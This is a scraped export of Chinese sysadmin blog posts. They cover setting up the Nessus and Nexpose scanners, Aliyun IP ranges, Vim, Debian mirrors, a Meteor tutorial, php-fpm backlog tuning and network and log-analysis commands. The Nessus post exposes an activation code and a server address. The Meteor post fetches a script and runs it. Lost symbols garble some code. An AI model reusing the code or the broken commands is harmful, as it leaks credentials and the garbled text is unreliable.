[{"location":"//blog.pytool.com/Hacker/2017-09-06 nexpose","title":"nexpose","text":"注册码申请\nhttps://www.rapid7.com/info/nexpose-community/","tags":null},{"location":"//blog.pytool.com/Hacker/2017-09-06 nessus","title":"Nessus","text":"注册\nhttp://www.tenable.com/products/nessus-home\nYour activation code for the Nessus Home is\nE793-A801-D230-1175-7DCD\n\n安装启动\nsystemctl start nessusd.service\n\nhttps://118.190.98.144:8834\nrinetd sdl...","tags":null},{"location":"//blog.pytool.com/Hacker/IP段/2015-03-29 aliyun","title":"阿里云IP段","text":"\n101.200.0.0/15\n101.37.0.0/16\n101.37.0.0/17\n101.37.0.0/24\n101.37.128.0/17\n\n103.52.196.0/22\n103.52.196.0/23\n103.52.196.0/24\n103.52.198.0/23\n106.11.0.0/16\n106.11.0.0/17\n106.11.0.0/18\n106.11.1.0/24\n106.11.128.0/17\n106.11.32.0/22\n106.11.36.0/22\n106.11.48.0/21\n106.11.56.0/21\n106.11.64.0/19\n110.173.192.0/20\n110.173.196.0/24\n110.173.208.0/20\n110.75.0.0/16\n110.75.236.0/22\n110.75.239.0/24\n110.75.240.0/20\n110.75.242.0/24\n110.75.243.0/24\n110.75.244.0/22\n110.76.0.0/19\n110.76.21.0/24\n110.76.32.0/20\n110.76.48.0/20\n112.124.0.0/16\n112.125.0.0/16\n112.126.0.0/16\n112.127.0.0/16\n112.74.0.0/16\n112.74.0.0/17\n112.74.116.0/22\n112.74.120.0/22\n112.74.128.0/17\n112.74.32.0/19\n112.74.64.0/22\n112.74.68.0/22\n114.215.0.0/16\n114.55.0.0/16\n114.55.0.0/17\n114.55.128.0/17\n115.124.16.0/22\n115.124.20.0/22\n115.124.24.0/21\n115.28.0.0/16\n115.29.0.0/16\n118.190.0.0/16\n118.190.0.0/17\n118.190.0.0/24\n118.190.128.0/17\n118.31.0.0/16\n118.31.0.0/17\n118.31.0.0/24\n118.31.128.0/17\n119.38.208.0/21\n119.38.216.0/21\n119.38.219.0/24\n119.42.224.0/20\n119.42.242.0/23\n119.42.244.0/22\n119.42.248.0/21\n120.24.0.0/14\n120.24.0.0/15\n120.25.0.0/18\n120.25.104.0/22\n120.25.108.0/24\n120.25.110.0/24\n120.25.111.0/24\n120.25.112.0/23\n120.25.115.0/24\n120.25.136.0/22\n120.25.64.0/19\n120.25.96.0/21\n120.27.0.0/17\n120.27.128.0/17\n120.27.128.0/18\n120.27.192.0/18\n120.55.0.0/16\n120.76.0.0/15\n120.76.0.0/16\n120.77.0.0/16\n120.78.0.0/15\n121.0.16.0/21\n121.0.24.0/22\n121.0.28.0/22\n121.196.0.0/16\n121.197.0.0/16\n121.198.0.0/16\n121.199.0.0/16\n121.40.0.0/14\n121.42.0.0/18\n121.42.0.0/24\n121.42.128.0/18\n121.42.17.0/24\n121.42.192.0/19\n121.42.224.0/19\n121.42.64.0/18\n123.56.0.0/15\n123.56.0.0/16\n123.57.0.0/16\n139.129.0.0/16\n139.129.0.0/17\n139.129.128.0/17\n139.196.0.0/16\n139.196.0.0/17\n139.196.128.0/17\n139.224.0.0/16\n139.224.0.0/17\n139.224.128.0/17\n140.205.0.0/16\n140.205.128.0/18\n140.205.192.0/18\n140.205.32.0/19\n140.205.76.0/24\n182.92.0.0/16\n203.107.0.0/24\n203.107.1.0/24\n203.209.224.0/19\n218.244.128.0/19\n223.4.0.0/16\n223.5.0.0/16\n223.5.5.0/24\n223.6.0.0/16\n223.6.6.0/24\n223.7.0.0/16\n39.100.0.0/14\n39.104.0.0/14\n39.104.0.0/15\n39.104.0.0/24\n39.106.0.0/15\n39.108.0.0/16\n39.108.0.0/17\n39.108.0.0/24\n39.108.128.0/17\n39.96.0.0/13\n39.96.0.0/14\n39.96.0.0/24\n42.120.0.0/16\n42.121.0.0/16\n42.156.128.0/17\n42.96.128.0/17\n45.113.40.0/22\n45.113.40.0/23\n45.113.40.0/24\n45.113.42.0/23\n47.92.0.0/14\n47.92.0.0/15\n47.92.0.0/24\n47.94.0.0/15","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 VIM ","title":"文本编辑 Vim","text":"---\nVim - 文本/代码编辑器之中最为优秀经典的上古神器！\n一起来说 Vim 语\n简明 Vim 练级攻略\nvim编辑器技巧备忘（初级-中级）\nhttps://github.com/dofy/learn-vim\nvim-程序员的利器\n史上最全Vim快捷键键位图\n提高 Vim 使用效率的 12 个技巧\n提高VIM 效率\n让人相见恨晚的vim插件：模糊查找神器LeaderF \nVimTips\nUbuntu  vi 上下左右变ABCD问题解决方法-安装vim的full版本\nsudo apt-get remove vim-common\nsudo apt-get install vim\nsudo add-apt-repository ppa:jonathonf/vim\n\n:version ：显示的VIMRC目录\n:function ：查看加载的所有function\n:scriptnames ：显示vim启动后加载的所有script\n:rew    重新回到第一个编辑的文档\n:args   显示所有要编辑的文件\n:marks  查看所有的mark\n:reg    查看所有的@寄存器值\n:buffers 等价 :ls 查看所有的buffer\n:tabs\n:tags\n:clist :cw\njumps     显示所有跳转历史      [count]c-o \t[count]c-i\n:changes  显示所有变更历史 \t    [count]g; \t  [count]g,\n:scriptnames 看看vim加载了哪些脚本\n:h keycodes 常见键盘键\n\nq: 进入命令历史编辑\nq: will show you command history in Vim.\nq/ will show you history of searches\n 打开光标所在词的文件\ngf 就是这么牛B\n\nCan I use SPACE as mapleader in VIM?\nlet mapleader = ' '\nnnoremap leaderh :helpgrepspace\n\n VIM环境变量\n:set all查看所有环境变量的设置\n:set查看所有与系统默认不同的环境变量\n:set variable?显示指定环境变量的当前值\n:set runtimepath?显示script搜索路径\nvim 变量查看\n下面三个前缀用来访问特殊的数值\n$ --访问环境变量；\n\u0026 --访问 Vim 选项；\n  :echo \u0026\n  \"echo \u0026foldmethod\n@ --访问寄存器。\n map映射\n\n在vim配置文件中经常会看到map、nmap、imap、vmap、vnoremap、nunmap、nmapclear等，都是什么意思呢？\n\nmap前的n、v、nore、un等表示下列含义：\nnore—— 表示非递归。\nn ——表示在普通模式下生效。\nv ——表示在可视模式下生效。\ni ——表示在插入模式下生效。\nc——表示在命令行模式下生效。\nun——后面跟按键组合，表示删除这个映射。\nclear——表示清除相关模式下的所有映射。\n\"n\"     Normal\n\"v\"     Visual (including Select)\n\"o\"     Operator-pending\n\"i\"     Insert\n\"c\"     Cmd-line\n\"s\"     Select\n\"x\"     Visual\n\"l\"     langmap language-mapping\n\"\"      Normal, Visual and Operator-pending\n\n映 射 与 运 行 模 式\n有五种映射存在\n对于普通模式: 当输入命令时.\n对于可视模式: 当输入命令并且 Visual 区域已被设置为高亮时.\n对于 Operator-pending mode: 当一个操作符正在进行中 (\"d\", \"y\", \"c\",等等之后)\n  例如: \":omap { w\" 会使 \"y{\" 和 \"yw\" 一样, \"d{\" 和 \"dw\"一样.\n对于插入模式: 也被用于替换模式.\n对于命令行模式: 当输入一个 \":\" 或 \"/\" 命令时.","tags":null},{"location":"//blog.pytool.com/Linux/2010-01-01 debain常见问题","title":"Debian 7 wheezy 安装日志","text":"---\n原文链接\nDebian 的发行版\n\nDebian 一直维护着至少三个发行版: \"稳定版(stable)\"，\"测试版(testing)\" 和 \"不稳定版(unstable)\"。\n\n稳定版(stable)\n    \"稳定版\"包含了 Debian 官方最近一次发行的软件包。\n    作为 Debian 的正式发行版本，它是我们优先推荐给用户您选用的版本。\n    当前 Debian 的\"稳定版\"版本号是 8.6，开发代号为 jessie。已经于2016年09月17日发布。\n测试版(testing)\n    \"测试版\"包含了那些暂时未被收录进入\"稳定版\"的软件包，但它们已经进入了候选队列。使用这个版本的最大益处在于它拥有更多版本较新的软件。\n    想要了解 什么是\"测试版\" 以及 如何成为\"稳定版\" 的更多信息，请看 Debian FAQ。\n    当前的\"测试版\"版本代号是 stretch。\n不稳定版(unstable)\n    \"不稳定版\"存放了 Debian 现行的开发工作。通常，只有开发者和那些喜欢过惊险刺激生活的人选用该版本。\n    \"不稳定版\"的版本代号永远都被称为 sid。\n发行版目录\n    下一代 Debian 正式发行版的代号为 \"stretch\" — 发布时间尚未确定\n    Debian 8 (\"jessie\") — 当前的稳定版\n    Debian 7 (\"wheezy\") — 被淘汰的稳定版\n    Debian 6.0 (\"squeeze\") — 被淘汰的稳定版\n    Debian GNU/Linux 5.0 (\"lenny\") — 被淘汰的稳定版\n    Debian GNU/Linux 4.0 (\"etch\") — 被淘汰的稳定版\n    Debian GNU/Linux 3.1 (\"sarge\") — 被淘汰的稳定版\n    Debian GNU/Linux 3.0 (\"woody\") — 被淘汰的稳定版\n    Debian GNU/Linux 2.2 (\"potato\") — 被淘汰的稳定版\n    Debian GNU/Linux 2.1 (\"slink\") — 被淘汰的稳定版\n    Debian GNU/Linux 2.0 (\"hamm\") — 被淘汰的稳定版\n\ngroupmod -g 99 docker\ngroupadd -r -g 999 mysql \u0026\u0026 useradd -r -u 999 -g mysql -c mysql -d /var/lib/mysql -s /sbin/nologin mysql\n\nsed -i \"s|deb.debian.org|mirrors.aliyun.com|g\" /etc/apt/sources.list\n\nvi /etc/apt/sources.list\n\ndeb http://mirrors.aliyun.com/debian jessie main contrib non-free\ndeb http://mirrors.aliyun.com/debian jessie-proposed-updates main contrib non-free\ndeb http://mirrors.aliyun.com/debian jessie-updates main contrib non-free\ndeb http://mirrors.aliyun.com/debian jessie-backports main contrib non-free\n\ndeb-src http://mirrors.aliyun.com/debian jessie main contrib non-free\ndeb-src http://mirrors.aliyun.com/debian jessie-proposed-updates main contrib non-free\ndeb-src http://mirrors.aliyun.com/debian jessie-updates main contrib non-free\ndeb-src http://mirrors.aliyun.com/debian jessie-backports main contrib non-free\n\ndeb http://mirrors.aliyun.com/debian-security/ jessie/updates main non-free contrib\ndeb-src http://mirrors.aliyun.com/debian-security/ jessie/updates main non-free contrib\n重新整理，虛擬機一節\n\n虚拟机\n\n VirtualBox\n\naptitude install -t wheezy-backports -R virtualbox virtualbox-dkms \\\nvirtualbox-qt virtualbox-guest-additions-iso\n\n开启 USB 2.0 支持\n https://www.virtualbox.org/wiki/Downloads\n双击安装 OracleVMVirtualBoxExtensionPack-4.3.12-93733.vbox-extpack\n\n 入组\ngpasswd -a fb vboxusers\n\nqemu / kvm\n\naptitude install -t wheezy-backports -R qemu-system qemu-utils\n\n 修正模块载入操作的若干问题\n/etc/init.d/qemu-system-x86 问题多多，用稳定版代替\n 提取 https://packages.debian.org/wheezy/qemu-kvm 中的 /etc/init.d/qemu-kvm\n并做适当修改，增加 vhost-net 功能\n\nvi /etc/init.d/qemu-kvm { diff unified 格式","tags":null},{"location":"//blog.pytool.com/Post/前端技术/meteor/2016-03-29  使用 Meteor 轻松开发实时网站","title":"使用 Meteor 轻松开发实时网站","text":"原文链接\n什么是 Meteor？\n\nMeteor 是一种新的 JavaScript 框架，用于自动化和简化实时运行的 Web 应用程序的开发。它使用一个名为分布式数据协议 (Distributed Data Protocol, DDP) 的协议来处理实时通信，使用 WebSockets 的新浏览器以及使用 Asynchronous JavaScript + XML (Ajax) 长轮询的旧浏览器来支持这种协议。在这两种情况下，浏览器到服务器的通信是透明的。\n\nDDP 协议旨在处理 JavaScript Serialized Object Notation (JSON) 文档集合，使 JSON 文档容易创建、更新、删除、查询和访问。因为 DDP 是一种开源协议，所以您可将它连接到任何客户端或数据存储。它为 MongoDB 提供了开箱即使用支持。\n\n事实上，Meteor 提供了两个 MongoDB 数据库：一个客户端缓存数据库和服务器上的一个 MongoDB 数据库。当一个用户更改一些数据时（例如通过单击 Save），在浏览器中运行的 JavaScript 代码会更新本地 MongoDB 中的相应的数据库项，然后向服务器发出一个 DDP 请求。该代码立即像操作已获得成功那样继续运行，因为它不需要等待服务器回复。与此同时，服务器在后台更新。如果服务器操作失败或返回一个意外结果，那么客户端 JavaScript 代码会依据从服务器新返回的数据立即进行调整。这种调整称为延迟补偿，向用户提供了更高的认知速度。\n\n显然，甚至连 Meteor 的模板系统也是为简化实时通信而设计的。在大多数 Web 框架中，您可以轻松地混合使用超文本标记语言 (HTML) 和代码，或者与 HTML 等效的标记，比如 HTML 抽象标记语言 (Haml)。这使您能够轻松地将来自数据库的动态值插入发送给用户的页面中。在这之后，您应该负责准备提供一个系统来观察对数据的更改，然后更新您的标记。但是，Meteor 中的模板系统用于记录访问了模板中的哪些数据，并自动回调，以便在底层数据更改时调用此 HTML，使实时模板变得更加简单快捷。\n\n回页首\n示例：链接流行度竞赛\n\nMeteor 的模板功能可使众多实时应用程序更容易编写。例如，假设您希望创建一个的站点，用户可在其中输入链接（即统一资源定位符，URL），并投票肯定和否决它们，而且赢得流行度竞赛的 URL 会显示在一个列表顶部。通过使用 Meteor，您可以轻松地实时编写这样一个应用程序，以便用户可在其他用户投票时看见他们的 65 张选票。\n\n回页首\n安装 Meteor\n\n要安装 Meteor，可以将 清单 1 中所示的代码键入到一个 Linux® 或 Mac OS® X 终端中。Meteor 不支持 Microsoft® Windows®。\n清单 1. 安装 Meteor\n\ncurl https://install.meteor.com   installmeteor.sh\nchmod u+x installmeteor.sh\n./installmeteor.sh\n\n现在您可创建一个新项目。\n\n回页首\n创建一个新项目\n\nmeteor 命令可自动化包含新项目创建过程中 Meteor 需要操作的一切内容的。键入 清单 2 中所示的命令，以便创建一个名为 realtimelinks 的项目。\n清单 2. 创建您的 Meteor 项目\n\nmeteor realtimelinks\ncd realtimelinks\n\nMeteor 创建了一个目录，其中包含一个 HTML 文件、一个 JavaScript 文件和一个级联样式表 (CSS) 文件。最后一个文件是一个标准 CSS 文件，但前两个值得讨论一下。您可以从 下载 一节下载 realtimelinks.html 和 realtimelinks.js 文件的完整版本。\n\n回页首\nrealtimelinks.html 文件\n\n清单 3 显示了 realtimelinks.html 文件的标头和正文片段。\n清单 3. realtimelinks.html 标头和正文片段\nhead\ntitleRealtime Links Demo/title\n/head\n\nbody\n  {{  header }}\n  {{  linklist }}\n  {{  addnewlink }}\n/body\n可以看到，HTML 模板的开头非常简单。无需担忧如何包含 BODY 标记、DOCTYPE 修饰符甚至 JavaScript 和 CSS 文件。Meteor 会为您处理所有这些操作。有关 Meteor 的 JavaScript 和 CSS 包的更多信息，请参阅 参考资料，获取 Meteor 网站的链接。\n{{   语法表示 “呈现此模板”。可以看到，realtimelinks.html 呈现了 3 个模板：\n    header 是一个简单头部，显示了数据库中的链接数量。\n    linklist 显示了链接的列表和它们的相关投票。\n    addnewlink 是添加新链接的表单。\n\n清单 4 显示了 header 模板。\n清单 4. realtimelinks.html header 模板\ntemplate name=\"header\"\n\nh1The Link Collection/h1\n\n\tpWe currently have {{collectionsize}} links./p\n\n/template\nheader 模板呈现了一个 h1 标记以及对集合大小的简短描述。collectionsize 方法是在 JavaScript 文件 realtimelinks.js 中定义的（这将在 下一节 中详细讨论）。Meteor 自动观察某个模板插入了哪些数据片段。所以，在更新集合大小时，header 模板会自动更新。\n请注意，这里使用的 {{ ... } 语法类似于 Ruby on Rails 中的 %= ... % 或 PHP 中的 ?= ... ?。它可插入任意代码，所以能够以这种方式插入任何有用的动态表达式。\n清单 5 显示了 linklist 模板。\n清单 5. realtimelinks.html linklist 模板\n","tags":null},{"location":"//blog.pytool.com/Linux/2011-01-01 Linux backlog性能分析","title":"Linux  php-fpm backlog参数潜在问题","text":"http://blog.csdn.net/willas/article/details/11634825\n\n有高并发的业务，就必须要调整backlog。对于PHP而言，需要注意的有3方面：\n\n    1、操作系统 | sysctl\n\n    2、WEB前端 | 比如：Nginx\n\n    3、PHP后台 | 比如：php-fpm\n\n操作系统以CentOS为例，可通过默认配置 /etc/sysctl.conf 文件进行调整。比如：\n\nnet.core.somaxconn = 1048576 # 默认为128\n\nnet.core.netdevmaxbacklog = 1048576 # 默认为1000\n\nnet.ipv4.tcpmaxsynbacklog = 1048576 # 默认为1024\n\nWEB前端以Nginx为例，可通过默认配置 /etc/nginx/nginx.conf 文件中的监听选项来调整。比如：\n\nlisten       80 backlog=8192; # 默认为511\n\nPHP后台，以PHP-FPM为例，可以通过默认配置 /etc/php-fpm.d/www.conf 文件进行调整。比如：\n\nlisten.backlog = 8192 # 默认为-1（由系统决定）\n\n大系统下，如上3处都应该进行调整。\n\n值得注意的是：\n\n    PHP-FPM的配置文件中，关于listen.backlog选项的注释有些误导人：\n\n; Set listen(2) backlog. A value of '-1' means unlimited.\n; Default Value: -1\n\n实际上如果使用默认值，很容易出现后端无法连接的问题，按老文档上的解释这个默认是200。建议此处不要留空，务必设置一个合适的值。\n\n       前几天有业务在新机器上线测试时，发现个问题：同样的资源的虚机、同样配置的ngxin+PHP-fpmweb后端的两台机器，测试后发现：访问.html文件时QPS相差不大，但是访问php\n\n页面时其中一台的QPS是另一台的数倍。通过分析，发现是php-fpm的backlog参数引起的，可以通过设置php-fpm.conf中的backlog参数来解决。下面是对问题的简单分析。\n\n一、问题分析\n\n       1、通过测试分析，的确存在所述的性能相差数倍的问题，因为访问静态文件的性能相当，所以可以确定排除nginx错误的可能，猜想是不是有php执行过慢导致呢？\n\n于是安装了我们针对php5.2.5开发的slow log调试模块后发现没有执行慢的地方，然后把目光放到了nginx 与php建立连接的阶段上，使用tcpdump在服务器上抓包，\n\n发现性能差的机器上存在大量的SYN3秒超时，并且会伴有请求头的超时重传。如下图：\n\n        看来凶手已经找到了：是SYN 超时。一般SYN 超时是由于服务端backlog引起的，在我们的应用中，nginx –  php-fpm，所以php-fpm相当于服务端，查看php-fpm配置发现 backlog值是 -1 !!\n\ngdb 跟踪fpm启动过程发现fpm没有对-1进行处理，而是直接把 -1 赋给了listen 系统调用，抱着好奇的心下载了linux2.6.18内核源码，跟踪listen系统调用执行过程如下：\n\nasmlinkage long syslisten(int fd, intbacklog)        {\n\nif ((sock = sockfdlookuplight(fd, \u0026err, \u0026fputneeded))!= NULL) {\n\n         if((unsigned) backlog   sysctlsomaxconn)               //unsigned 把backlog变成了一个32位的最大整数：4294967295\n\n             backlog =sysctlsomaxconn;                                    //也就是说当backlog=-1时，在内核中backlog被赋值为/proc/sys/net/core/somaxconn 的值，本机上为262144\n\n      err =securitysocketlisten(sock, backlog);\n\n        if (!err)\n\n                  err= sock-  ops-  listen(sock, backlog);\n\n        fputlight(sock-  file,fputneeded);\n\n        }\n\n         return err;\n\n}\n\n        抱着试试看的心态，改变了fpm配置backlog的值，测试发现把php-fpm的backlog值设为：10 –262143 之间机器的性能恢复了（1-10因为太小，所以性能不太理想），CPU跑得很high，但是\n\n只要大于262144，性能就又变差了。结合上面的问题，SYN超时一般是服务器端完成连接队列满导致的， 既然backlog值被设置成了somaxconn，那么不应该出现内核中完成连接队列满的情况。\n\n    为了搞清楚backlog值对tcp监听套接字的影响，编写了一个测试程序：服务端listen之后不accept，客户端循环来连接（服务端非阻塞）。\n\n（1）把backlog设置为-1 或 大于262144的一个值时，客户端连接很慢，抓包发现有SYN 3、6秒超时，服务器端ESTABLISHED的连接也很少，如图：\n\n（2）把backlog设置为n（10 ","tags":null},{"location":"//blog.pytool.com/Linux/2011-01-01 Linux TCPIP网络命令","title":"Linux网络命令","text":"实时监控网络状态：\n\nwatch -n 1 netstat -ant \n\nCLOSED \t没有使用这个套接字[netstat 无法显示closed状态]\nLISTEN \t套接字正在监听连接[调用listen后]\nSYNSENT \t套接字正在试图主动建立连接[发送SYN后还没有收到ACK]\nSYNRECEIVED \t正在处于连接的初始同步状态[收到对方的SYN，但还没收到自己发过去的SYN的ACK]\nESTABLISHED \t连接已建立\nCLOSEWAIT \t远程套接字已经关闭：正在等待关闭这个套接字[被动关闭的一方收到FIN]\nFINWAIT1 \t套接字已关闭，正在关闭连接[发送FIN，没有收到ACK也没有收到FIN]\nCLOSING \t套接字已关闭，远程套接字正在关闭，暂时挂起关闭确认[在FINWAIT1状态下收到被动方的FIN]\nLASTACK \t远程套接字已关闭，正在等待本地套接字的关闭确认[被动方在CLOSEWAIT状态下发送FIN]\nFINWAIT2 \t套接字已关闭，正在等待远程套接字关闭[在FINWAIT1状态下收到发过去FIN对应的ACK]\nTIMEWAIT \t这个套接字已经关闭，正在等待远程套接字的关闭传送[FIN、ACK、FIN、ACK都完毕，这是主动方的最后一个状态，在过了2MSL时间后变为CLOSED状态]\n\nLinux 基础网络命令列表\n\n我在计算机网络课程上使用 FreeBSD，不过这些 UNIX 命令应该也能在 Linux 上同样工作。\n连通性\n\n    ping host：发送 ICMP echo 消息（一个包）到主机。这可能会不停地发送直到你按下 Control-C。Ping 的通意味着一个包从你的机器通过 ICMP 发送出去，并在 IP 层回显。Ping 告诉你另一个主机是否在运行。\n    telnet host [port]：与主机在指定的端口通信。默认的 telnet 端口是 23。按 Control-] 以退出 telnet。其它一些常用的端口是：\n        7 —— echo 端口\n        25 —— SMTP，用于发送邮件\n        79 —— Finger (LCTT 译注：维基百科 - Finger protocal，不过举例 Finger 恐怕不合时宜，倒不如试试 80？），提供该网络下其它用户的信息。\n\nARP\n\nARP 用于将 IP 地址转换为以太网地址。root 用户可以添加和删除 ARP 记录。当 ARP 记录被污染或者错误时，删除它们会有用。root 显式添加的 ARP 记录是永久的 —— 代理设置的也是。ARP 表保存在内核中，动态地被操作。ARP 记录会被缓存，通常在 20 分钟后失效并被删除。\n\n    arp -a：打印 ARP 表。\n    arp -s ipaddress macaddress [pub]：添加一条记录到表中。\n    arp -a -d：删除 ARP 表中的所有记录。\n\n路由\n\n    netstat -r：打印路由表。路由表保存在内核中，用于 IP 层把包路由到非本地网络。\n    route add：route 命令用于向路由表添加静态（手动指定而非动态）路由路径。所有从该 PC 到那个 IP/子网的流量都会经由指定的网关 IP。它也可以用来设置一个默认路由。例如，在 IP/子网处使用 0.0.0.0，就可以发送所有包到特定的网关。\n    routed：控制动态路由的 BSD 守护程序。开机时启动。它运行 RIP 路由协议。只有 root 用户可用。没有 root 权限你不能运行它。\n    gated：gated 是另一个使用 RIP 协议的路由守护进程。它同时支持 OSPF、EGP 和 RIP 协议。只有 root 用户可用。\n    traceroute：用于跟踪 IP 包的路由。它每次发送包时都把跳数加 1，从而使得从源地址到目的地之间的所有网关都会返回消息。\n    netstat -rnf inet：显示 IPv4 的路由表。\n    sysctl net.inet.ip.forwarding=1：启用包转发（把主机变为路由器）。\n    route add|delete [-net|-host] destination gateway：（如 route add 192.168.20.0/24 192.168.30.4）添加一条路由。\n    route flush：删除所有路由。\n    route add -net 0.0.0.0 192.168.10.2：添加一条默认路由。\n    routed -Pripv2 -Pnordisc -d [-s|-q]：运行 routed 守护进程，使用 RIPv2 协议，不启用 ICMP 自动发现，在前台运行，供给模式或安静模式。\n    route add 224.0.0.0/4 127.0.0.1：为本地地址定义多播路由。（LCTT 译注：原文存疑）\n    rtquery -n host（LCTT 译注：增加了 host 参数）：查询指定主机上的 RIP 守护进程（手动更新路由表）。\n\n其它\n\n    nslookup：向 DNS 服务器查询，将 IP 转为名称，或反之。例如，nslookup facebook.com 会给出 facebook.com 的 IP。\n    ftp host [port]（LCTT 译注：原文中 water 应是笔误）：传输文件到指定主机。通常可以使用 登录名 \"anonymous\" , 密码 \"guest\" 来登录。\n    rlogin -l host（LCTT 译注：添加了 host 参数）：使用类似 telnet 的虚拟终端登录到主机。\n\n重要文件\n\n    /etc/hosts：域名到 IP 地址的映射。\n    /etc/networks：网络名称到 IP 地址的映射。\n    /etc/protocols：协议名称到协议编号的映射。\n    /etc/services：TCP/UDP 服务名称到端口号的映射。\n\n工具和网络性能分析\n\n    ifconfig interface address [up]：启动接口。\n    ifconfig interface [down|delete]：停止接口。\n    ethereal \u0026：在后台打开 ethereal 而非前台。\n    tcpdump -i -vvv：抓取和分析包的工具。\n    netstat -w [seconds] -I [interface]：显示网络设置和统计信息。\n    udpmt -p [port] -s [bytes] targethost：发送 UDP 流量。\n    udptarget -p [port]：接收 UDP 流量。\n    tcpmt -p [port] -s [bytes] targethost：发送 TCP 流量。\n    tcptarget -p [port]：接收 TCP 流量。\n\n交换机\n\n    ifconfig sl0 srcIP dstIP：配置一个串行接口（在此前先执行 slattach -l /dev/ttyd0，此后执行 sysctl net.inet.ip.forwarding=1）\n    telnet 192.168.0.254：从子网中的一台主机访问交换机。\n    sh ru 或 show running-configuration：查看当前配置。\n    configure terminal：进入配置模式。\n    exit：退出当前模式。（LCTT 译注：原文存疑）\n\nVLAN\n\n    vlan n：创建一个 ID 为 n 的 VLAN。\n    no vlan N：删除 ID 为 n 的 VLAN。\n    untagged Y：添加端口 Y 到 VLAN n。\n    ifconfig vlan0 create：创建 vlan0 接口。\n    ifconfig vlan0 vlanID vlandev em0：把 em0 加入到 vlan0 接口（LCTT 译注：原文存疑），并设置标记为 ID。\n    ifconfig vlan0 [up]：启用虚拟接口。\n    tagged Y：为当前 VLAN 的端口 Y 添加标记帧支持。\n\nUDP/TCP\n\n    socklab udp：使用 UDP 协议运行 socklab。\n    sock：创建一个 UDP 套接字，等效于输入 sock udp 和 bind。\n    sendto Socket ID hostname port #：发送数据包。\n    recvfrom Socket ID byte #：从套接字接收数据。\n    socklab tcp：使用 TCP 协议运行 socklab。\n    passive：创建一个被动模式的套接字，等效于 socklab，sock tcp，bind，listen。\n    accept：接受进来的连接（可以在发起进来的连接之前或之后执行）。\n    connect hostname port #：等效于 socklab，sock tcp，bind，connect。\n    close：关闭连接。\n    read byte #：从套接字中读取 n 字节。\n    write：（例如，write ciao、write #10）向套接字写入 \"ciao\" 或 10 个字节。\n\nNAT/防火墙\n\n    rm /etc/resolv.conf：禁止地址解析，保证你的过滤和防火墙规则正确工作。\n    ipnat -f filename：将过滤规则写入文件。\n    ipnat -l：显示活动的规则列表。\n    ipnat -C -F：重新初始化规则表。\n    map em0 192.168.1.0/24 -  195.221.227.57/32 em0：将 IP 地址映射到接口。\n    map em0 192.168.1.0/24 -  195.221.227.57/32 portmap tcp/udp 20000:50000：带端口号的映射。\n    ipf -f filename：将过滤规则写入文件。\n    ipf -F -a：重置规则表。\n    ipfstat -I：当与 -s 选项合用时列出活动的状态条目（LCTT 译注：原文存疑）。","tags":null},{"location":"//blog.pytool.com/Linux/2011-01-01 Linux 网络修复","title":"Linux系统分析","text":"Linux 常用内核网络参数与相关问题处理\nLinux系统安全检查工具——Lynis\n\nawk网络连接分析与网络日志分析示例()\n一、awk命令 网络连接分析\n\n1、查看TCP连接状态\n\nnetstat -nat |awk '{print $6}'|sort|uniq -c|sort -rn\nnetstat -n | awk '/^tcp/ {++S[$NF]};END {for(a in S) print a, S[a]}' 或\nnetstat -n | awk '/^tcp/ {++state[$NF]}; END {for(key in state) print key,\"\\t\",state[key]}'\nnetstat -n | awk '/^tcp/ {++arr[$NF]};END {for(k in arr) print k,\"\\t\",arr[k]}'\nnetstat -n |awk '/^tcp/ {print $NF}'|sort|uniq -c|sort -rn\nnetstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c\n\n2、查找请求数前20个IP（常用于查找攻来源）：\n\nnetstat -anlp|grep 80|grep tcp|awk '{print $5}'|awk -F: '{print $1}'|sort|uniq -c|sort -nr|head -n20\nnetstat -ant |awk '/:80/{split($5,ip,\":\");++A[ip[1]]}END{for(i in A) print A[i],i}' |sort -rn|head -n20\n\n3、用tcpdump嗅探80端口的访问看看谁最高\n\ntcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F\".\" '{print $1\".\"$2\".\"$3\".\"$4}' | sort | uniq -c | sort -nr |head -20\n\n4、查找较多timewait连接\n\nnetstat -n|grep TIMEWAIT|awk '{print $5}'|sort|uniq -c|sort -rn|head -n20\n\n5、找查较多的SYN连接\n\nnetstat -an | grep SYN | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -nr | more\n\n6、根据端口列进程\n\nnetstat -ntlp | grep 80 | awk '{print $7}' | cut -d/ -f1\n-d / 指定切割的分隔符\n-f 1 指定要显示的filed\n\n二、awk命令 网站日志分析\n\n1、获得访问前10位的ip地址\n\ncat access.log|awk '{print $1}'|sort|uniq -c|sort -nr|head -10\ncat access.log|awk '{counts[$(11)]+=1}; END {for(url in counts) print counts[url], url}'\n\n2、访问次数最多的文件或页面,取前20\n\ncat access.log|awk '{print $11}'|sort|uniq -c|sort -nr|head -20\n\n3、列出传输最大的几个exe文件（分析下载站的时候常用）\n\ncat access.log |awk '($7~/\\.exe/){print $10 \" \" $1 \" \" $4 \" \" $7}'|sort -nr|head -20\n\n4、列出输出大于200000byte(约200kb)的exe文件以及对应文件发生次数\n\ncat access.log |awk '($10   200000 \u0026\u0026 $7~/\\.exe/){print $7}'|sort -n|uniq -c|sort -nr|head -100\n\n5、如果日志最后一列记录的是页面文件传输时间，则有列出到客户端最耗时的页面\n\ncat access.log |awk '($7~/\\.php/){print $NF \" \" $1 \" \" $4 \" \" $7}'|sort -nr|head -100\n\n6、列出最最耗时的页面(超过60秒的)的以及对应页面发生次数\n\ncat access.log |awk '($NF   60 \u0026\u0026 $7~/\\.php/){print $7}'|sort -n|uniq -c|sort -nr|head -100\n\n7、列出传输时间超过 30 秒的文件\n\ncat access.log |awk '($NF   30){print $7}'|sort -n|uniq -c|sort -nr|head -20\n\n8、统计网站流量（G)\n\ncat access.log |awk '{sum+=$10} END {print sum/1024/1024/1024}'\n1G=1024M=10241024K=102410241024b\n\n9、统计404的连接\n\nawk '($9 ~/404/)' access.log | awk '{print $9,$7}' | sort\n\n10、统计http status.\n\ncat access.log |awk '{counts[$(9)]+=1}; END {for(code in counts) print code, counts[code]}'\ncat access.log |awk '{print $9}'|sort|uniq -c|sort -rn\n\n11、蜘蛛记录分析\n查看抓取内容的搜索引擎蜘蛛\n\n/usr/sbin/tcpdump -i eth0 -l -s 0 -w - dst port 80 | strings | grep -i user-agent | grep -i -E 'bot|crawler|slurp|spider'\n\n假设apache日志格式为：\n\n118.78.199.98 – - [09/Jan/2010:00:59:59 +0800] “GET /Public/Css/index.css HTTP/1.1″ 304 – “http://www.a.cn/common/index.php” 